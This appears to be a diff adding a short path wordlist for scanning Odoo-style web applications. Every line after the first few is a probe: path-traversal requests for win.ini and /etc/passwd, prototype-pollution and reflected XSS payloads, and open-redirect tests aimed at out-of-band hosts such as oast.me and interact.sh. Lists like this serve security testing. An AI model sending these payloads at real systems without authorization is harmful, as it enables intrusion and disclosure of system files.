@@ -1,0 +1,14 @@
+/web/database/manager
+/base_import/static/c:/windows/win.ini
+/web/static/c:/windows/win.ini
+/base/static/c:/windows/win.ini
+/?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x
+/?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
+/web/login
+/web/database/selector/
+/web/session/logout?redirect=https://oast.me
+/web/session/logout?redirect=https%3a%2f%2foast.me%2f
+/web/dbredirect?redirect=https%3a%2f%2foast.me%2f
+/base_import/static/etc/passwd
+/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>
+/website/lang/en_US?r=https://interact.sh/
